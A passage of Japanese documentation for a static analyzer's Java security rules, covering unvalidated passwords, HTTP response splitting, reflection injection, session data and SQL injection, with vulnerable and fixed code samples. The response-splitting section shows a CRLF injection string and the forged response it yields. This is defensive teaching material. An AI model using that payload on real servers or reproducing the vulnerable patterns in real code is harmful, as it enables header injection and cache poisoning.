認証情報として使用するデータが安全であることを確認するのに役立ちます。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、未検証のパスワードが getConnection メソッドに渡されています。

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import javax.servlet.http.HttpServletRequest;

public class Example
{
    private HttpServletRequest httpServletRequest;

    public void example()
        throws SQLException
    {
        String URL = "jdbc:oracle:thin:@amrood:1521:EMP";
        String password = getData();
        Connection conn = DriverManager.getConnection(URL, "user", password); // 違反
    }

    private String getData()
    {
        return httpServletRequest.getParameter("string");
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>

パスワードを getConnection メソッドに渡す前に validatePassword メソッドを
使用してパスワードを検証します。

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    private HttpServletRequest httpServletRequest;

    public void example()
        throws SQLException
    {
        String URL = "jdbc:oracle:thin:@amrood:1521:EMP";
        String password = getData();
        String validPassword = validatePassword(password);
        Connection conn = DriverManager.getConnection(URL, "user", validPassword); // 違反ではない
    }

    private String getData()
    {
        return httpServletRequest.getParameter("string");
    }

    abstract String validatePassword(String passwd);
}


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/f891d151-8bb8-497e-b8f0-03cecb02417c">https://app.hackedu.com/link/f891d151-8bb8-497e-b8f0-03cecb02417c</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A2 - Broken_Authentication):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication</A>

OWASP API Security Top 10-2019
API2-Broken User Authentication
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa2-broken-user-authentication.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa2-broken-user-authentication.md</A>

PCI Data Security Standard 3.2
6.5.10 Broken authentication and session management
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-287: Improper Authentication
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/287.html">https://cwe.mitre.org/data/definitions/287.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-522: Insufficiently Protected Credentials
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/522.html">https://cwe.mitre.org/data/definitions/522.html</A>

2020 CWE Weaknesses On the Cusp
CWE-284: Improper Access Control
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/284.html">https://cwe.mitre.org/data/definitions/284.html</A>

CWE-256: Unprotected Storage of Credentials
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/256.html">https://cwe.mitre.org/data/definitions/256.html</A>

Tags: OWASP, PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDRESP" href="#top">[Top]</a><br/><br/><STRONG>
HTTP レスポンス分割から防御する [BD.SECURITY.TDRESP]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

HTTP レスポンス分割は、HTTP リクエストなどの信頼性のないソースを通じて
Web アプリケーションに入り込んだ汚染されたデータが、検証されずに HTTP
レスポンスに含められる場合に発生する脆弱性です。
このルールは、HTTP レスポンス分割の脆弱性の可能性がある場合に違反をレポートします。

汚染されたデータを検証せずに以下のメソッドに渡している場合に違反をレポートします。

javax.servlet.http.HttpServletResponse
   * void sendRedirect(...) メソッド
   * void addCookie(...) メソッド
   * void addIntHeader(...) メソッド
   * void addDateHeader(...) メソッド
   * void setHeader(...) メソッド
   * void setIntHeader(...) メソッド
   * void setDateHeader(...) メソッド
   * void setStatus(...) メソッド

javax.faces.context.ExternalContext
   * void redirect(...)
   
javax.servlet.ServletContext
   * void getRequestDispatcher(...)

javax.servlet.ServletReques
   * void getRequestDispatcher(...)
   
また、HTTP リクエストを特定のメソッドにマップするためのアノテーションが付けられたメソッドから
汚染されたデータが返される場合にも違反をレポートします。
コントローラー クラスおよび汚染された戻り値を表すメソッド アノテーションを指定して
ルールをパラメータライズする必要があります。詳細については「パラメーター」セクションを
参照してください。

   
HTTP レスポンス分割攻撃を防ぐため、汚染されたデータが危険なメソッドに渡されない
こと、またユーザーの入力が適切にエンコードまたはサニタイズされていることを確認
する必要があります。

エンコーディング処理は、以下のメソッドで行うことができます。これらのメソッドに
パラメーターとして渡されたデータが汚染されていた場合も、返された値は安全です。

java.net.URLEncoder
	* String encode(...) メソッド
	
javax.servlet.http.HttpServletResponse	
	* String encodeURL(...) メソッド
	* String encodeUrl(...) メソッド
	* String encodeRedirectURL(...) メソッド
	* String encodeRedirectUrl(...) メソッド


このルールでは、ルールをパラメータライズすることによって、他の
検証メソッドを定義することができます。
詳細については「パラメーター」セクションを参照してください。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.2


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

HTTP ヘッダーに含められるデータに CR (%0d または \r) および LF (%0a または \n)
文字が入れられた場合、攻撃が成功します。攻撃者は、これらの文字の後に特別に細工した
文字列を続け、HTTP レスポンスに任意のヘッダーを含めたり、任意のコンテンツを持つ
別の HTTP レスポンスを作成したりすることができます。

HTTP レスポンス分割の脆弱性を利用して、XSS 攻撃、クロスユーザ ディフェイスメント、
Web キャッシュ汚染、ページ ハイジャックが行われる可能性があります。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[次のアノテーションを持つメソッドの汚染された戻り値をレポートする:] オプションは、
メソッドのアノテーションを指定します。このオプションが設定されている場合、ルールは
指定されたアノテーションのいずれかでアノテートされたメソッドが汚染された値を返して
いる場合に違反をレポートします。
アノテーションを設定するには、次の列に入力します。
- [有効] メソッドを有効または無効にします。無効化すると、ルールはアノテートされたメソッドが汚染されたデータを返していても違反をレポートしません。
- [完全修飾型名 (ワイルドカード)] 列にはアノテーションの完全修飾型名を指定する必要があります。
デフォルトでは、以下のアノテーションでアノテートされたメソッドが汚染された値を返している場合に
違反をレポートします。
- 'org.springframework.web.bind.annotation.RequestMapping'
- 'org.springframework.web.bind.annotation.GetMapping'
- 'org.springframework.web.bind.annotation.PutMapping'
- 'org.springframework.web.bind.annotation.PostMapping'
- 'org.springframework.web.bind.annotation.DeleteMapping'
- 'org.springframework.web.bind.annotation.PatchMapping'
- 'org.springframework.web.bind.annotation.ExceptionHandler'
- 'org.springframework.web.bind.annotation.ResponseBody'
- 'org.springframework.web.bind.annotation.ResponseStatus'
このオプションは [コントローラーを示すクラス アノテーション] パラメーターと
ともに設定する必要があります (下を参照)。ルールはコントローラー クラスのもの
ではないメソッドを無視します。

[コントローラーを示すクラス アノテーション] パラメーターは、アノテートされたクラスが
コントローラーであることを示すとみなすアノテーションを指定します。
アノテーションを設定するには、次の列に入力します。
ｰ [有効] アノテーションを有効または無効にします。無効化すると、ルールはクラスをコントローラーとして扱いません。
- [完全修飾型名 (ワイルドカード)] 列にはアノテーションの完全修飾型名を指定する必要があります。

デフォルトでは、次のアノテーションでアノテートされたクラスがコントローラーであると
みなされます。
- 'org.springframework.stereotype.Controller'
- 'org.springframework.web.bind.annotation.RestController'
- 'org.springframework.web.bind.annotation.ControllerAdvice'
- 'org.springframework.web.bind.annotation.RestControllerAdvice'

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
HTTP レスポンス分割を防ぐのに役立ちます。「セキュリティとの関連」セクションも参照してください。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.io.IOException;
import javax.servlet.ServletException;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Example
    extends HttpServlet
{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException
    {
        String name = req.getParameter("name");
        // ...
        resp.addCookie(new Cookie("namer", name)); // 違反
        // ...
    }
}


正常なレスポンスは以下のようになります。

	HTTP/1.1 200 OK
	...
	Set-Cookie: name=Joe
	...

しかし、HTTP レスポンスが 2 つのレスポンスに分割されるような
リクエストを作成することもできます。"Joe\r\nHTTP/1.1 200 OK\r\n..."
などの悪意のある文字列をサブミットすると、以下のようにレスポンスが
分割されます。

	HTTP/1.1 200 OK
	...
	Set-Cookie: author=Joe

	HTTP/1.1 200 OK
	...

2 番目のレスポンスは、完全に攻撃者の制御下にあります。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
データを使用する前に検証します。

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class Repair
    extends HttpServlet
{
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
        throws UnsupportedEncodingException
    {
        String name = URLEncoder.encode(req.getParameter("name"), "UTF_8");
        // ...
        resp.addCookie(new Cookie("namer", name)); // 違反ではない
        // ...
    }
}

こうすると、ハッカーが "Joe\r\nHTTP/1.1 200 OK\r\n..." のような悪意の
ある文字列をサブミットした場合、レスポンスは次のようになります。

    HTTP/1.1 200 OK
    ...
    Set-Cookie: name=Joe%0D%0AHTTP%2F1.1+200+OK%0D%0A
    ...

このレスポンスは安全です。


教育とトレーニング

Introduction to Injection Attacks
Video: <A target="_blank" HREF="https://vimeo.com/262069083">https://vimeo.com/262069083</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8-Intro-to-Injections.pdf</A>


Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/8e118750-e80a-4713-a0ca-c50367e08351">https://app.hackedu.com/link/8e118750-e80a-4713-a0ca-c50367e08351</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A7-Cross-Site Scripting (XSS))
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">https://www.owasp.org/index.php/Top_10-2017_A7-Cross-Site_Scripting_(XSS)</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.7 Cross-site scripting (XSS)
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/79.html">https://cwe.mitre.org/data/definitions/79.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-352: Cross-Site Request Forgery (CSRF)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/352.html">https://cwe.mitre.org/data/definitions/352.html</A>

2020 CWE Weaknesses On the Cusp
CWE-601: URL Redirection to Untrusted Site ('Open Redirect')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/601.html">https://cwe.mitre.org/data/definitions/601.html</A>

CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/113.html">https://cwe.mitre.org/data/definitions/113.html</A>

CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/644.html">https://cwe.mitre.org/data/definitions/644.html</A>

OWASP HTTP Response Splitting:
<A target="_blank" HREF="https://www.owasp.org/index.php/HTTP_Response_Splitting">https://www.owasp.org/index.php/HTTP_Response_Splitting</A>

Wikipedia HTTP Response Splitting:
<A target="_blank" HREF="http://en.wikipedia.org/wiki/HTTP_response_splitting">http://en.wikipedia.org/wiki/HTTP_response_splitting</A>

Introduction to HTTP Response Splitting:
<A target="_blank" HREF="http://www.securiteam.com/securityreviews/5WP0E2KFGK.html">http://www.securiteam.com/securityreviews/5WP0E2KFGK.html</A>

HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics:
<A target="_blank" HREF="http://www.cgisecurity.com/lib/whitepaper_httpresponse.pdf">http://www.cgisecurity.com/lib/whitepaper_httpresponse.pdf</A>

OWASP Code Review Guide 2008 V1.1
Reviewing by technical control: Input Validation p. 81
Reviewing Code for Cross-site scripting p. 141

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDRFL" href="#top">[Top]</a><br/><br/><STRONG>
Reflection インジェクションから防御する [BD.SECURITY.TDRFL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、
エンド ユーザーからのデータが実行されるコードに影響するケースを
検出します。
たとえば、ロードするクラス名を生成したり、
呼び出されるメソッド名を生成したりするケースです。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

java.lang.ClassLoader
   * loadClass(String)

java.lang.Class
   * forName(String)
   * getDeclaredField(String)
   * getDeclaredMethod(String, Class[])
   * getField(String)
   * getMethod(String, Class[])
   * getResource(String)
   * getResourceAsStream(String)

java.lang.reflect.InvocationHandler
   * invoke(Object, Method, Object[])

java.lang.reflect.AccessibleObject
   * setAccessible(AccessibleObject[], boolean)
   * void setAccessible(boolean flag)

java.lang.reflect.Field
   * all get* methods

java.lang.reflect.Method
   * invoke(Object, Object[])

java.lang.reflect.ReflectPermission
   * ReflectPermission(String)



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0



</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

汚染されたデータを検証せずに、
ロードするクラス名に使用した場合、
悪意のあるプログラマによる不正なコードが実行されて
システムが損害を受ける可能性があります。

また、このルールは PCI DSS (Payment Card Industry Data Security Standard) の
要件 6「安全なシステムとアプリケーションの開発と保守」を推進するのに役立ちます。
特に、項目 6.5.6「インジェクション欠陥」を検証します。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

通常、リフレクションの処理でユーザー データを直接使用するケースは
まずありません。
しかし、ユーザー データを使ってどのクラスのロードが必要かを判断したり、
ユーザー データをクラス名やメソッド名の一部として使用したりするケースは
十分ありえます。

次のサンプル コードは、厳密にはユーザー データをロードされるクラス名に
使用していません。しかし、sClassName を汚染されたデータと
見なす理由は、ここでどのような処理が行われるかが不明であること、そして
ユーザー データの一部をクラス名で使用でき、これはシステムの危険な操作に
つながる恐れがあることです。

import java.security.Policy.Parameters;
import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    void example(HttpServletRequest req)
        throws Exception
    {
        String sParameters = req.getParameter("user_parameters");
        Parameters params = parseUserParams(sParameters);
        String sClassName = chooseClassToProcessData(params);
        ClassLoader.getSystemClassLoader().loadClass(sClassName); // 違反
        // ... use this class to process data
    }

    public abstract Parameters parseUserParams(String sParameters);

    public abstract String chooseClassToProcessData(Parameters params);
}




</PRE>
<STRONG>
修正
</STRONG>
<PRE>
使用前にデータを検証します。

import java.security.Policy.Parameters;
import javax.servlet.http.HttpServletRequest;

public abstract class Repair
{
    void example(HttpServletRequest req)
        throws Exception
    {
        String sParameters = validate(req.getParameter("user_parameters"));
        Parameters params = parseUserParams(sParameters);
        String sClassName = chooseClassToProcessData(params);
        ClassLoader.getSystemClassLoader().loadClass(sClassName); // 違反ではない
        // ... use this class to process data
    }

    public abstract Parameters parseUserParams(String sParameters);

    public abstract String chooseClassToProcessData(Parameters params);

    public abstract String validate(Object obj);
}



教育とトレーニング

Code Injections
Video: <A target="_blank" HREF="https://vimeo.com/304405723">https://vimeo.com/304405723</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_8_3-Code-Injections.pdf</A>

Parasoft の教育パートナーが、この脆弱性と予防ベスト プラクティスに関するトレーニングを提供しています。
トレーニング リソースへのアクセス方法については、Parasoft 製品サポートにお問い合わせください。
<A target="_blank" HREF="https://app.hackedu.com/link/00f59b67-07a8-4341-b221-95c7c6d000e1">https://app.hackedu.com/link/00f59b67-07a8-4341-b221-95c7c6d000e1</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

OWASP Top 10 2017 (A1-Injection):
<A target="_blank" HREF="https://www.owasp.org/index.php/Top_10-2017_A1-Injection">https://www.owasp.org/index.php/Top_10-2017_A1-Injection</A>

OWASP API Security Top 10-2019
API8-Injection
<A target="_blank" HREF="https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md">https://github.com/OWASP/API-Security/blob/v1.4.1/2019/en/src/0xa8-injection.md</A>

PCI Data Security Standard 3.2
6.5.1 Injection flaws
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

CWE-470: Use of Externally-Controlled Input to Select Classes or Code ('Unsafe Reflection')
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/470.html">https://cwe.mitre.org/data/definitions/470.html</A>

SEI CERT Oracle Coding Standard for Java
SEC02-J. Do not base security checks on untrusted sources
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/SEC02-J.+Do+not+base+security+checks+on+untrusted+sources">https://wiki.sei.cmu.edu/confluence/display/java/SEC02-J.+Do+not+base+security+checks+on+untrusted+sources</A>

OWASP Code Review Guide 2008 V1.1
Reviewing Code for Cross-site scripting p. 141

Tags: OWASP, PCI-DSS, CWE, CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDSESSION" href="#top">[Top]</a><br/><br/><STRONG>
信頼されていないデータを HTTP セッションに格納しない [BD.SECURITY.TDSESSION]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、エンド ユーザーから直接取得したデータが HTTP セッションに格納
されている場合に違反をレポートします。

汚染されたデータを検証せずに javax.servlet.http.HttpSession インターフェイスの
次のいずれかのメソッドに渡している場合、違反がレポートされます。
* setAttribute(String, Object)
* putValue(String, Object)

ルール パラメーターを使用して、汚染されたデータのソースと検証メソッドを
指定できます (「パラメーター」を参照)。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

v10.4.3



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

カテゴリ: 入力ベースの攻撃

「適切に確立され、維持されている信頼境界がない場合、必然的にプログラマは
どのデータが検証済みでどのデータが未検証かわからなくなります。このような
混乱は、最終的にはデータが検証されずに使用される事態につながります。」
[CWE-501] 



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[汚染データのソース] パラメーターを使用して、汚染されたデータのソースとみなす
データソースを指定できます。以下のソースを指定できます。
   * Servlet リクエスト
   * ファイル
   * パイプ
   * リモート メソッドの戻り値
   * リフレクション メソッド
   * 環境変数およびシステム プロパティ
   * Spring 環境プロパティ
   * JMS (Java Message Service)
   * データベース
   * ストリーム指向 API (ストリーム、リーダー、チャネル)
   * コンソール
   * GUI コントロール
   * エントリ ポイント メソッドのパラメーター
   * リモート メソッドのパラメーター
   * ネイティブ メソッド
   * 検証を行っていない Struts フォーム
   * ネットワーク
   * ソケット
   * Spring HTTP リクエスト

[検証メソッド] パラメータを使用すると、汚染されたデータを検証するメソッドを指定できます。
検証メソッドのいずれかが呼び出された場合、パラメーター、ターゲット オブジェクト、戻り値は
良性であるとみなされます。
検証メソッドを設定し、影響を受けるデータを指定するには次の列に入力します。

ｰ [有効] メソッドを有効または無効にします。無効化すると、ルールはメソッドを検証メソッドとして扱いません。

- [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型で宣言されたメソッドを指定するには '*' を使用します。

- [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

- [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。
  
- [this オブジェクトは検証済み] 列を有効に設定した場合、メソッドはメソッドが呼び出されたオブジェクトを
  検証することを表します。

ｰ [検証済みのデータを返す] 列を有効に設定した場合、メソッドは戻り値を検証します。

- [検証されるパラメーター] 列に値を設定した場合、メソッドはパラメーターを無害化します。
1 から始まるパラメーターの番号をカンマで区切って指定するか、 すべてのパラメーターが
影響を受ける場合は '*' を指定します。

[数字データを汚染されているとみなさない] パラメーターをオンにすると、数字データ
(プリミティブ型およびオブジェクトの両方) が信頼されないソースから取得されている
(汚染メソッドから返されている) 場合でも、汚染されていないとみなされます。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>

未検証のデータの利用を防ぐのに役立ちます (「セキュリティとの関連」を参照)。



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、ユーザーから提供された未検証のデータが HttpSession
オブジェクトに格納されています。

import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    void example(HttpServletRequest request)
    {
        String username = request.getParameter("usrname");
        if (request.getSession().getAttribute("AttrUser") == null) {
            request.getSession().setAttribute("AttrUser", username); // 違反
        }
    }
}



</PRE>
<STRONG>
修正
</STRONG>
<PRE>

ユーザーから提供されたデータを validate()検証メソッドで検証してから
HttpSession オブジェクトに格納します。

import javax.servlet.http.HttpServletRequest;

public abstract class Example
{
    void example(HttpServletRequest request)
    {
        String username = validate(request.getParameter("usrname"));
        if (request.getSession().getAttribute("AttrUser") == null) {
            request.getSession().setAttribute("AttrUser", username); // 違反ではない
        }
    }

    public abstract String validate(Object obj);
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-501: Trust Boundary Violation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/501.html">https://cwe.mitre.org/data/definitions/501.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.SECURITY.TDSQL" href="#top">[Top]</a><br/><br/><STRONG>
SQL インジェクションから防御する [BD.SECURITY.TDSQL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、SQL インジェクションの可能性を検出します。
つまり、
SQL クエリーを実行/準備したり接続を取得したりするメソッドに、
汚染されたデータが渡された可能性です。


ユーザーから提供されるデータや未検証のデータ ソースからのデータを使って
SQL クエリーを作成するアプリケーションにおいて
使用前にデータを検証していない場合、
悪意のあるプログラマは SQL 文を改竄できます。
その結果、データベースが不正にコントロールされるだけでなく
システムでコマンドが実行される恐れすらあります。

このルールは、汚染されたデータが
次のメソッドに渡されたときに違反をレポートします。

java.sql.DriverManager
   * getConnection(String url)

java.sql.Connection
   * prepareCall(...)
